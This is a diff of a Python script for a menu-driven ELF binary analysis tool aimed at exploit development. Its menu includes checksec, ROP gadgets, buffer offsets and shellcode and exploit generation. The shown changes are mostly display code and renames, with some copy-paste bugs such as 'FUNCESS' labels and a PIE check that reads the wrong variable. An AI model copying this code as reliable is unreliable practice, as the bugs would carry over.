@@ -2,14 +2,14 @@
 # coding:UTF-8
 
 # -------------------------------------------------------------------------------------
-#           PYTHON3 SCRIPT FILE FOR THE LOCAL ANALYSIS OF BINARY FILES
+#              PYTHON3 SCRIPT FILE FOR THE LOCAL ANALYSIS OF ELF FILES
 #         BY TERENCE BROADBENT MSc DIGITAL FORENSICS & CYBERCRIME ANALYSIS
 # -------------------------------------------------------------------------------------
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
+# Version : ELF MASTER
 # Details : Load required imports.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -23,22 +23,10 @@ import linecache
 
 from termcolor import colored
 
-colour0 = "red"			# DISPLAY COLOURS
-colour1 = "grey"
-colour2 = "cyan"
-colour3 = "blue"
-colour4 = "black"
-colour5 = "white"
-colour6 = "green"
-colour7 = "yellow"
-colour8 = "magenta"
-
-colourx = colour7		# DEFUALT COLOUR
-
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : FULL STACK
+# Version : ELF MASTER
 # Details : Create functional subroutines called from main.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
@@ -73,6 +61,28 @@ def command(variable):
 def prompt():
    null = input("\nPress ENTER to continue...")
    return   
+   
+def catsFile(variable):
+   counter = lineCount(variable)
+   if counter > 0:
+      command("echo '" + Green + "'")
+      command("cat " + variable)
+      command("echo '" + Reset + "'")
+   return   
+   
+def clearClutter():
+   command("rm *.tmp")
+   linecache.clearcache()
+   return
+   
+def dispBanner(variable,flash):
+   ascii_banner = pyfiglet.figlet_format(variable).upper()
+   ascii_banner = ascii_banner.rstrip("\n")
+   if flash == 1:
+      command("clear")
+      print(colored(ascii_banner,colour0, attrs=['bold']))
+   command("pyfiglet " + variable + " > banner.tmp")
+   return
    
 def saveParams():
    command("echo '" + RAX + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
@@ -122,55 +132,36 @@ def saveParams():
    cursor.execute("UPDATE REMOTETARGET SET FIL = \"" + FIL2 + "\" WHERE IDS = 2"); connection.commit()
    cursor.execute("UPDATE REMOTETARGET SET TSH = \"" + SRT2 + "\" WHERE IDS = 2"); connection.commit()
    return     
-   
-def catsFile(variable):
-   counter = lineCount(variable)
-   if counter > 0:
-      command("echo '" + Green + "'")
-      command("cat " + variable)
-      command("echo '" + Reset + "'")
-   return   
-   
-def clearClutter():
-   command("rm *.tmp")
-   linecache.clearcache()
-   return
-   
-def dispBanner(variable,flash):
-   ascii_banner = pyfiglet.figlet_format(variable).upper()
-   ascii_banner = ascii_banner.rstrip("\n")
-   if flash == 1:
-      command("clear")
-      print(colored(ascii_banner,colour0, attrs=['bold']))
-   command("pyfiglet " + variable + " > banner.tmp")
-   return
 
 def dispMenu():
    print('\u2554' + ('\u2550')*36 + '\u2566' + ('\u2550')*20 + '\u2566' + ('\u2550')*47 + '\u2566' + ('\u2550')*58 + '\u2557')
-# --  
+# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2551' + " REGISTERS FOR FILENAME", end =' ')
    if FIL[:7] == "unknown":
       print(colored(FIL.upper()[:11],colour7), end=' ')
    else:
       print(colored(FIL.upper()[:11],colour6), end=' ')
    print('\u2551' + " CHECKSEC DATA      " + '\u2551' + " " + colored("OFFSET",colour5) + (" ")*14 + colored("FUNCTIONS ",colour5) + colored(funcNum[:7],colour6) + (" ")*9 + '\u2551' + (" ")*1 + colored("OFFSET",colour5) + " "*14 + colored("GADGETS ",colour5) + colored(gadgNum[:7],colour6) + (" ")*22 + '\u2551') 
-# --   
+# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2560' + ('\u2550')*15+ '\u2566' + ('\u2550')*20 + '\u256C' + ('\u2550')*20 + '\u256C' + ('\u2550')*24 + '\u2550' + ('\u2550')*22 + '\u256C' + ('\u2550')*58 + '\u2563')   
-# --   
+# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2551' + " RAX/EAX/AX/AH " + '\u2551', end=' ')
    if RAX[:18] == "0x0000000000000000":
       print(colored(RAX[:COL1],colour7), end=' ')
    else:
       print(colored(RAX[:COL1],colour6), end=' ')
-   print('\u2551' + " " + colored(RE,colourx) + " " +  '\u2551', end=' ')
-   if SRT in ADDR[0]:
-      print(colored(ADDR[0],colour3), end=' ')
+   if "RELRO    unknown" in RE:
+      print('\u2551' + " " + colored(RE,colour7) + " " +  '\u2551', end=' ')
    else:
-      print(colored(ADDR[0],colour6), end=' ')   
+      print('\u2551' + " " + colored(RE,colour6) + " " +  '\u2551', end=' ')
+   if SRT in FUNC[0]:
+      print(colored(FUNC[0],colour3), end=' ')
+   else:
+      print(colored(FUNC[0],colour6), end=' ')   
    print('\u2551', end=' ')   
    print(colored(GADD[0],colour6), end=' ')
    print('\u2551')      
-# --   
+# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2551' + " RBX/EBX/BX/BH " + '\u2551', end=' ')
    if RBX[:18] == "0x0000000000000000":
       print(colored(RBX[:COL1],colour7), end=' ')
@@ -180,30 +171,36 @@ def dispMenu():
    if "No Canary" in ST:
       print(colored(ST,'blue'), end=' ')
    else:
-      print(colored(ST ,colourx), end=' ')   
+      if "STACK    unknown" in ST:
+         print(colored(ST ,colour7), end=' ')
+      else:
+         print(colored(ST ,colour6), end=' ')      
    print('\u2551', end=' ')
-   if SRT.rstrip(" ") in ADDR[1]:
-      print(colored(ADDR[1],colour3), end=' ')
+   if SRT.rstrip(" ") in FUNC[1]:
+      print(colored(FUNC[1],colour3), end=' ')
    else:
-      print(colored(ADDR[1],colour6), end=' ')   
+      print(colored(FUNC[1],colour6), end=' ')   
    print('\u2551', end=' ')   
    print(colored(GADD[1],colour6), end=' ')
    print('\u2551')   
-# --  
+# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2551' + " RCX/ECX/CX/CH " + '\u2551', end=' ')
    if RCX[:18] == "0x0000000000000000":
       print(colored(RCX[:COL1],colour7), end=' ')
    else:
       print(colored(RCX[:COL1],colour6), end=' ')
-   print('\u2551' + " " + colored(FO,colourx) + " " +  '\u2551', end=' ')
-   if SRT.rstrip(" ") in ADDR[2]:
-      print(colored(ADDR[2],colour3), end=' ')
+   if "FORTIFY  unknown" in FO:
+      print('\u2551' + " " + colored(FO,colour7) + " " +  '\u2551', end=' ')
    else:
-      print(colored(ADDR[2],colour6), end=' ')   
+      print('\u2551' + " " + colored(FO,colour6) + " " +  '\u2551', end=' ')   
+   if SRT.rstrip(" ") in FUNC[2]:
+      print(colored(FUNC[2],colour3), end=' ')
+   else:
+      print(colored(FUNC[2],colour6), end=' ')   
    print('\u2551', end=' ')   
    print(colored(GADD[2],colour6), end=' ')
    print('\u2551')   
-# --  
+# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2551' + " RDX/EDX/DX/DH " + '\u2551', end=' ')
    if RDX[:18] == "0x0000000000000000":
       print(colored(RDX,colour7), end=' ')
@@ -213,39 +210,41 @@ def dispMenu():
    if "NX      Disabled" in NX:
       print(colored(NX,'blue'), end=' ')
    else:
-      print(colored(NX,colourx), end=' ')      
+      if "NX       unknown" in NX:
+         print(colored(NX,colour7), end=' ')      
+      else:
+         print(colored(NX,colour6), end=' ')            
    print('\u2551', end=' ')      
-   if SRT.rstrip(" ") in ADDR[3]:
-      print(colored(ADDR[3],colour3), end=' ')
+   if SRT.rstrip(" ") in FUNC[3]:
+      print(colored(FUNC[3],colour3), end=' ')
    else:
-      print(colored(ADDR[3],colour6), end=' ')   
+      print(colored(FUNC[3],colour6), end=' ')   
    print('\u2551', end=' ')   
    print(colored(GADD[3],colour6), end=' ')
    print('\u2551')   
-# --  
+# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2551' + " RSI/ESI/SI/SL " + '\u2551', end=' ')
    if RSI[:18] == "0x0000000000000000":
       print(colored(RSI[:COL1],colour7), end=' ')
    else:
-      print(colored(RSI[:COL1],colour6), end=' ')
-      
+      print(colored(RSI[:COL1],colour6), end=' ')      
    print('\u2551', end=' ')
    if "No PIE" in PI:
       print(colored(PI,'blue'), end=' ')
    else:
-      print(colored(PI ,colourx), end=' ')   
+      if "PIE      unknown" in RW:
+         print(colored(PI ,colour7), end=' ')   
+      else:
+         print(colored(PI ,colour7), end=' ')         
    print('\u2551', end=' ')
-       
-#   print('\u2551' + " " + colored(PI,colourx) + " " +  '\u2551', end=' ')
-   
-   if SRT.rstrip(" ") in ADDR[4]:
-      print(colored(ADDR[4],colour3), end=' ')
+   if SRT.rstrip(" ") in FUNC[4]:
+      print(colored(FUNC[4],colour3), end=' ')
    else:
-      print(colored(ADDR[4],colour6), end=' ')   
+      print(colored(FUNC[4],colour6), end=' ')   
    print('\u2551', end=' ')   
    print(colored(GADD[4],colour6), end=' ')
    print('\u2551')   
-# --   
+# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2551' + " RDI/EDI/DI/DL " + '\u2551', end=' ')
    if RDI[:18] == "0x0000000000000000":
       print(colored(RDI,colour7), end=' ')
@@ -255,18 +254,21 @@ def dispMenu():
    if "RWX     Segments" in RW:
       print(colored(RW,'blue'), end=' ')
    else:
-      print(colored(RW,colourx), end=' ')      
+      if "RWX      unknown" in RW:
+         print(colored(RW,colour7), end=' ')      
+      else:
+         print(colored(RW,colour6), end=' ')            
    print('\u2551', end=' ')   
-   if SRT.rstrip(" ") in ADDR[5]:
-      print(colored(ADDR[5],colour3), end=' ')
+   if SRT.rstrip(" ") in FUNC[5]:
+      print(colored(FUNC[5],colour3), end=' ')
    else:
-      print(colored(ADDR[5],colour6), end=' ')   
+      print(colored(FUNC[5],colour6), end=' ')   
    print('\u2551', end=' ')
    print(colored(GADD[5],colour6), end=' ')
    print('\u2551')           
-# --
+# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2551', end= ' ')
-   print(colored("RSP/ESP/SP/SL",colour2),end=' ')
+   print("RSP/ESP/SP/SL",end=' ')
    print('\u2551', end=' ')   
    if RSP[:18] == "0x0000000000000000":
       print(colored(RSP,colour7), end=' ')
@@ -277,138 +279,139 @@ def dispMenu():
       print(colored("OFFSET   " + OFF[:9],colour7), end=' ')
       print('\u2551', end=' ')
    else:
-      print(colored("OFFSET   " + OFF[:9],colour7,attrs=['bold']), end=' ')
+      print(colored("OFFSET   " + OFF[:9],colour2), end=' ')
       print('\u2551', end=' ')            
-   if SRT.rstrip(" ") in ADDR[6]:
-      print(colored(ADDR[6],colour3), end=' ')
+   if SRT.rstrip(" ") in FUNC[6]:
+      print(colored(FUNC[6],colour3), end=' ')
    else:
-      print(colored(ADDR[6],colour6), end=' ')   
+      print(colored(FUNC[6],colour6), end=' ')   
    print('\u2551', end=' ')   
    print(colored(GADD[6],colour6), end=' ')
    print('\u2551')   
-# --
+# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2551', end=' ')
-   print(colored("RBP/EBP/BP/BL",colour2), end=' ')
+   print("RBP/EBP/BP/BL", end=' ')
    print('\u2551', end=' ')   
    if RBP[:18] == "0x0000000000000000":
       print(colored(RBP,colour7), end=' ')
    else:
       print(colored(RBP,colour6), end=' ')      
    print('\u2551',end=' ')
-   if BIT[:6] == "64-Bit":
-      print(colored("         -8 Bytes ",colour7,attrs=['bold']), end=' ')
-   if BIT[:6] == "32-Bit":
-      print(colored("         -4 Bytes ",colour7,attrs=['bold']), end=' ')
-   if BIT[:7] == "unknown":
-      print(colored("                  ",colour7,attrs=['bold']), end=' ')
+   if BITS[:6] == "64-Bit":
+      print(colored("         -8 Bytes ",colour2), end=' ')
+   if BITS[:6] == "32-Bit":
+      print(colored("         -4 Bytes ",colour2), end=' ')
+   if BITS[:7] == "unknown":
+      print(colored("                  ",colour2), end=' ')
    print('\u2551', end=' ')   
-   if SRT.rstrip(" ") in ADDR[7]:
-      print(colored(ADDR[7],colour3), end=' ')
+   if SRT.rstrip(" ") in FUNC[7]:
+      print(colored(FUNC[7],colour3), end=' ')
    else:
-      print(colored(ADDR[7],colour6), end=' ')   
+      print(colored(FUNC[7],colour6), end=' ')   
    print('\u2551', end=' ')   
    print(colored(GADD[7],colour6), end=' ')
    print('\u2551')
-# --
+# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2551', end=' ')
    if ARC[:1] != "0" and OFF[:1] != "0":
-      print(colored("RIP/EIP     *", colour7,attrs=['bold']), end=' ')
+      print(colored("RIP/EIP    ", colour2), end=' ')
+      print(colored("*", colour2,attrs=['blink']), end=' ')
    else:
-      print(colored("RIP/EIP      ", colour7,attrs=['bold']), end=' ')   
+      print("RIP/EIP      ", end=' ')   
    print( '\u2551', end=' ')
-   if INS[:18] == "0x0000000000000000":
-      print(colored(INS,colour7), end=' ')
+   if INSP[:18] == "0x0000000000000000":
+      print(colored(INSP,colour7), end=' ')
    else:
-      print(colored(INS,colour6), end=' ')         
+      print(colored(INSP,colour6), end=' ')         
    print('\u2551', end=' ')   
-   if BIT[:6] == "64-Bit":
-      print(colored("         +8 Bytes ",colour7,attrs=['bold']), end=' ')
-   if BIT[:6] == "32-Bit":
-      print(colored("         +4 Bytes ",colour7,attrs=['bold']), end=' ')
-   if BIT[:7] == "unknown":
-      print(colored("                  ",colour7,attrs=['bold']), end=' ')      
+   if BITS[:6] == "64-Bit":
+      print(colored("         +8 Bytes ",colour2), end=' ')
+   if BITS[:6] == "32-Bit":
+      print(colored("         +4 Bytes ",colour2), end=' ')
+   if BITS[:7] == "unknown":
+      print(colored("                  ",colour2), end=' ')      
    print('\u2551', end=' ')   
-   if SRT.rstrip(" ") in ADDR[8]:
-      print(colored(ADDR[8],colour3), end=' ')
+   if SRT.rstrip(" ") in FUNC[8]:
+      print(colored(FUNC[8],colour3), end=' ')
    else:
-      print(colored(ADDR[8],colour6), end=' ')      
+      print(colored(FUNC[8],colour6), end=' ')      
    print('\u2551', end=' ')   
    print(colored(GADD[8],colour6), end=' ')
    print('\u2551')   
-# -- 
-   print('\u2551' + " START ADDRESS " + '\u2551', end=' ')
+# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
+   print('\u2551' + " START FUNCESS " + '\u2551', end=' ')
    if SRT[:18] == "0x0000000000000000":
       print(colored(SRT,colour7), end=' ')
    else:
       print(colored(SRT,colour6), end=' ')      
    print('\u2551' + " " + " "*COL1 + " " +  '\u2551', end=' ')   
-   if SRT.rstrip(" ") in ADDR[9]:
-      print(colored(ADDR[9],colour3), end=' ')
+   if SRT.rstrip(" ") in FUNC[9]:
+      print(colored(FUNC[9],colour3), end=' ')
    else:
-      print(colored(ADDR[9],colour6), end=' ')      
+      print(colored(FUNC[9],colour6), end=' ')      
    print('\u2551', end=' ')   
    print(colored(GADD[9],colour6), end=' ')
    print('\u2551')
-# --
-   print('\u2551' + " MAIN  ADDRESS " + '\u2551', end=' ')
+# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
+   print('\u2551' + " MAIN  FUNCESS " + '\u2551', end=' ')
    if MAIN[:18] == "0x0000000000000000":
       print(colored(MAIN,colour7), end=' ')
    else:
       print(colored(MAIN,colour6), end=' ')
    print('\u2551', end=' ') 
    print("                   " + '\u2551', end= ' ')
-   if SRT.rstrip(" ") in ADDR[10]:
-      print(colored(ADDR[10],colour3), end=' ')
+   if SRT.rstrip(" ") in FUNC[10]:
+      print(colored(FUNC[10],colour3), end=' ')
    else:
-      print(colored(ADDR[10],colour6), end=' ')   
+      print(colored(FUNC[10],colour6), end=' ')   
    print('\u2551', end=' ')   
    print(colored(GADD[10],colour6), end=' ')
    print('\u2551')
-# --
-   print('\u2551' + " CUS1  ADDRESS " + '\u2551', end=' ')   
+# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
+   print('\u2551' + " CUS1  FUNCESS " + '\u2551', end=' ')   
    if CUS1[:18] == "0x0000000000000000":
       print(colored(CUS1,colour7), end=' ')
    else:
       print(colored(CUS1,colour6), end=' ')
    print('\u2551', end=' ') 
    print("                   " + '\u2551', end= ' ') 
-   if SRT.rstrip(" ") in ADDR[11]:
-      print(colored(ADDR[11],colour3), end=' ')
+   if SRT.rstrip(" ") in FUNC[11]:
+      print(colored(FUNC[11],colour3), end=' ')
    else:
-      print(colored(ADDR[11],colour6), end=' ')   
+      print(colored(FUNC[11],colour6), end=' ')   
    print('\u2551', end=' ')   
    print(colored(GADD[11],colour6), end=' ')
    print('\u2551')
-# --   
-   print('\u2551' + " CUS2  ADDRESS " + '\u2551', end=' ')     
+# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
+   print('\u2551' + " CUS2  FUNCESS " + '\u2551', end=' ')     
    if CUS2[:18] == "0x0000000000000000":
       print(colored(CUS2,colour7), end=' ')
    else:
       print(colored(CUS2,colour6), end=' ')
    print('\u2551', end=' ')  
    print("                   " + '\u2551', end= ' ') 
-   if SRT.rstrip(" ") in ADDR[12]:
-      print(colored(ADDR[12],colour3), end=' ')
+   if SRT.rstrip(" ") in FUNC[12]:
+      print(colored(FUNC[12],colour3), end=' ')
    else:
-      if ADDR[13] != "":
-         print(colored(ADDR[12],colour0), end=' ')   
+      if FUNC[13] != "":
+         print(colored(FUNC[12],colour0), end=' ')   
       else:
-         print(colored(ADDR[12],colour6), end=' ')
+         print(colored(FUNC[12],colour6), end=' ')
    print('\u2551', end=' ')
    if GADD[13] != "":
       print(colored(GADD[12],colour0), end=' ')
    else:
       print(colored(GADD[12],colour6), end=' ')
    print('\u2551')
-# --         
+# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2560' + ('\u2550')*15 + '\u2569' + ('\u2550')*20 + '\u2569' + ('\u2550')*20 + '\u2569' + ('\u2550')*24 + '\u2550' + ('\u2550')*22 + '\u256C' + ('\u2550')*58 + '\u2563')
    return
    
 def options():
-   print('\u2551' + "(01) Set  ACCUMULATOR (11) Set MAIN ADDRESS (21) Read File Head (31) Pattern   Creater (41) HEX Editor   " + '\u2551' + " FILE INFORMATION AND DIAGNOSTICS " + (" ")*24 + '\u2551')
-# --      
-   print('\u2551' + "(02) Set BASE POINTER (12) Set CUS1 ADDRESS (22) Read   Objects (32) Initiate  Program (42) GHIDRA       " + '\u2560' + ('\u2550')*58 + '\u2563')
-   print('\u2551' + "(03) Set LOOP COUNTER (13) Set CUS2 ADDRESS (23) Read   Section (33) G.D.B.  Interface (43) ImmunityDeBug" + '\u2551' + " FORMAT      ", end=' ')
+   print('\u2551' + "(01) Set  ACCUMULATOR (11) Set MAIN FUNCESS (21) Read File Head (31) Pattern   Creater (41) HEX Editor   " + '\u2551' + " FILE INFORMATION AND DIAGNOSTICS " + (" ")*24 + '\u2551')
+# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
+   print('\u2551' + "(02) Set BASE POINTER (12) Set CUS1 FUNCESS (22) Read   Objects (32) Ltrace    Program (42) GHIDRA       " + '\u2560' + ('\u2550')*58 + '\u2563')
+   print('\u2551' + "(03) Set LOOP COUNTER (13) Set CUS2 FUNCESS (23) Read   Section (33) G.D.B.  Interface (43) ImmunityDeBug" + '\u2551' + " FORMAT      ", end=' ')
    if COM[:7] != "unknown":
       print(colored(COM,colour6), end=' ')
    else:
@@ -419,22 +422,22 @@ def options():
    else:
       print(colored(MODE[:7],colour6), end=' ') 
    print((" ")*9+ '\u2551')
-   # --
+# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2551' + "(04) Set DATALOCATION (14) Select  FILENAME (24) Read   Headers (34) Find SegmentFault (44) NASM Shell   " + '\u2551' + " ARCHITECTURE", end= ' ')
    if ARC[:7] == "unknown":
       print(colored(ARC,colour7), end=' ')
    else:
       print(colored(ARC,colour6), end=' ')
    print("FLAVOUR", end=' ')
-   print(colored(flavour,colour6),end=' ' )
+   print(colored(flavour[:5],colour6),end=' ' )
    print((" ")*11 + '\u2551')   
    print('\u2551' + "(05) Set SOURCE INDEX (15) Set Static  Mode (25) Read   Execute (35) Set BUFFER OFFSET (45) Gen ShellCode" + '\u2551' + " BITS        ", end=' ')
-   if BIT[:1] != "u":
-      print(colored(BIT,colour6), end=' ')
+   if BITS[:1] != "u":
+      print(colored(BITS,colour6), end=' ')
    else:
-      print(colored(BIT,colour7), end=' ')      
+      print(colored(BITS,colour7), end=' ')      
    print((" ")*25 + '\u2551')
-# --
+# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2551' + "(06) Set DESTIN INDEX (16) Set Dynamic Mode (26) Read DeBugInfo (36) Dis-Assemble MAIN (46) Gen ExploCode" + '\u2551' + " INDIAN      ", end=' ')
    if IND[:7] == "unknown":
       print(colored(IND,colour7), end=' ')
@@ -448,15 +451,15 @@ def options():
       print(colored(LIBC[:COL2-2],colour6), end=' ')
    print('\u2551')
    print('\u2551' + "(08) Set BASE POINTER (18) CheckSec Program (28) Read   Symbols (38) Dis-Assemble FUNC (48) G.D.B.Flavour" + '\u2551' + "                                                          " + '\u2551')
-   print('\u2551' + "(09) Set INST POINTER (19) List   Functions (29) Read Stab Data (39) Radare2 Enumerate (49) Reset Program" + '\u2551' + "                                                          " + '\u2551')
-   print('\u2551' + "(10) Set STARTADDRESS (20) List All Gadgets (30) Read HexFormat (40) Find LIBC Version (50) Exit         " + '\u2551' + "                                                          " + '\u2551')
+   print('\u2551' + "(09) Set INSP POINTER (19) List   Functions (29) Read Stab Data (39) Radare2 Enumerate (49) Reset Program" + '\u2551' + "                                                          " + '\u2551')
+   print('\u2551' + "(10) Set STARTFUNCESS (20) List All Gadgets (30) Read HexFormat (40) Find LIBC Version (50) Exit         " + '\u2551' + "                                                          " + '\u2551')
    print('\u255A' + ('\u2550')*105 + '\u2569' +  ('\u2550')*58 + '\u255D') #colored("VALUE",colour5)
    return
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : FULL STACK
+# Version : ELF MASTER
 # Details : START OF MAIN - Check running as root.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
@@ -470,68 +473,79 @@ else:
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : FULL STACK
+# Version : ELF MASTER
 # Details : Create local user-friendly variables.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
-maxDisp = 14							# UNLIMITED VALUE
+maxDispl = 14
+localDir = "BINMASTER"
 
-Yellow  = '\e[1;93m'						# OP SYSTEM COLOUR
+colour0 = "red"
+colour1 = "grey"
+colour2 = "cyan"
+colour3 = "blue"
+colour4 = "black"
+colour5 = "white"
+colour6 = "green"
+colour7 = "yellow"
+colour8 = "magenta"
+
+Yellow  = '\e[1;93m'
 Green   = '\e[0;32m'
-Reset   = '\e[0m'
 Red     = '\e[1;91m'
-
-localDir = "BINMASTER"						# LOCAL DIRECTORYS
+Reset   = '\e[0m'
       
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
+# Version : ELF MASTER
 # Details : Display program banner and boot system.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
 command("xdotool key Alt+Shift+S; xdotool type 'BINARY MASTER'; xdotool key Return")
 dispBanner("BINARY MASTER",1)
-print(colored("\t\tM A S T E R  C R A F T S M A N  E D I T I O N",colour7,attrs=['bold']))
+print(colored("\t\t\tG O L D E N  E L F  E D I T I O N",colour7,attrs=['bold']))
 print(colored("\n\n[*] Booting, please wait...", colour3))
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : FULL STACK
+# Version : ELF MASTER
 # Details : Initialise program files and variables.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
-if not os.path.exists(localDir):
-   command("mkdir " + localDir)
-   if not os.path.exists("RA.db"):
-      print("[-] Missing required file, locate RA.db first...")
-      exit(1)
-   else:
-      command("mv RA.db ./" + localDir + "/RA.db")
-else:
+if os.path.exists(localDir):
    print("[+] Directory " + localDir + " already exists...")
-
-if not os.path.exists(localDir + "/RA.db"):
-   print(colored("[!] WARNING!!! - RA.db missing, unable to connect to database...", colour0))
-   exit(1)
 else:
+   command("mkdir " + localDir)
+   print("[+] Creating directory " + localDir + "...")
+  
+if os.path.exists("RA.db"):
+   command("mv RA.db ./" + localDir + "/RA.db")
+   print("[+] Moving RA.db to " + localDir + "...")
+
+if os.path.exists(localDir + "/RA.db"):
    connection = sqlite3.connect(localDir + "/RA.db")
    cursor = connection.cursor()
+else:
+   print(colored("[!] WARNING!!! - RA.db missing, unable to connect to database...", colour0))
+   exit(1)
                   
 print("[+] Populating system variables...")
 
-SKEW = 0                                # TIME-SKEW SWITCH
-COL0 = 17+12				# MAX LEN COMPUTER NAME
-COL1 = 18                               # 0x0000000000000000
-COL2 = 45                               # MAX LEN ADDRE NAMEz
-COL3 = 23+33                            # MAX LEN GADD NAME
+COL1 = 18
+COL2 = 45
+COL3 = 56
 
-ADDR = [" "*COL2]*maxDisp		# ADDRESS VALUES
-GADD = [" "*COL3]*maxDisp		# ADDRESS NAMES
+FUNC = [" "*COL2]*maxDispl
+GADD = [" "*COL3]*maxDispl
+
+funcNum = spacePadding(" ", COL1)
+gadgNum = spacePadding(" ", COL1)
+flavour = spacePadding("intel", COL1)
 
 RE = spacePadding("RELRO    unknown", COL1)
 ST = spacePadding("STACK    unknown", COL1)
@@ -540,15 +554,21 @@ NX = spacePadding("NX       unknown", COL1)
 PI = spacePadding("PIE      unknown", COL1)
 RW = spacePadding("RWX      unknown", COL1)
 
-funcNum = spacePadding(" ",7)
-gadgNum = spacePadding(" ",7)
+# NEW VARIABLES THAT NEED TO BE ADDED TO THE DATABASE
 
-flavour = "intel"
+BITS = spacePadding("unknown", COL1)
+MODE = spacePadding("unknown", COL1)
+LIBC = spacePadding("unknown", COL2)
+
+INSP = "0x0000000000000000"
+MAIN = "0x0000000000000000"
+CUS1 = "0x0000000000000000"
+CUS2 = "0x0000000000000000"
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : FULL STACK
+# Version : ELF MASTER
 # Details : Check the database for stored variables.
 # Modified: N/A                                                               	
 # -------------------------------------------------------------------------------------
@@ -585,11 +605,6 @@ ARC = linecache.getline("ascii.tmp", 12).rstrip("\n")
 FIL = linecache.getline("ascii.tmp", 13).rstrip("\n")
 SRT = linecache.getline("ascii.tmp", 14).rstrip("\n")
 
-INS = "0x0000000000000000"
-MAIN = "0x0000000000000000"
-CUS1 = "0x0000000000000000"
-CUS2 = "0x0000000000000000"
-
 RAX = spacePadding(RAX, COL1)
 COM = spacePadding(COM, COL1)
 RBX = spacePadding(RBX, COL1)
@@ -602,18 +617,16 @@ RBP = spacePadding(RBP, COL1)
 OFF = spacePadding(OFF, COL1)
 IND = spacePadding(IND, COL1)
 ARC = spacePadding(ARC, COL1)
-FIL = spacePadding(FIL, COL0)
+FIL = spacePadding(FIL, COL1)
 SRT = spacePadding(SRT, COL1)
-INS = spacePadding(INS, COL1)
+INSP = spacePadding(INSP, COL1)
 
-BIT = spacePadding("unknown", COL1)
-LIBC = spacePadding("unknown", COL2)
-MODE = "unknown"
+command("sleep 5s")
    
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : FULL STACK
+# Version : ELF MASTER
 # Details : Start the main menu controller.
 # Modified: N/A                                                               	
 # -------------------------------------------------------------------------------------
@@ -630,8 +643,8 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - Secret option that ...
+# Version : ELF MASTER
+# Details : Menu option selected - Secret option that will run all commands.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -641,14 +654,14 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - RAX VALUE
+# Version : ELF MASTER
+# Details : Menu option selected - Set RAX value.
 # Modified: N/A
 # -------------------------------------------------------------------------------------      
       
    if selection =='1':
       BAK = RAX
-      RAX = input("[?] Please enter accumulator value: ")
+      RAX = input("[?] Please enter accumulator address: ")
       if RAX != "":
          RAX = spacePadding(RAX,COL1)
       else:
@@ -658,14 +671,14 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - RBX VALUE
+# Version : ELF MASTER
+# Details : Menu option selected - Set RBX value.
 # Modified: N/A
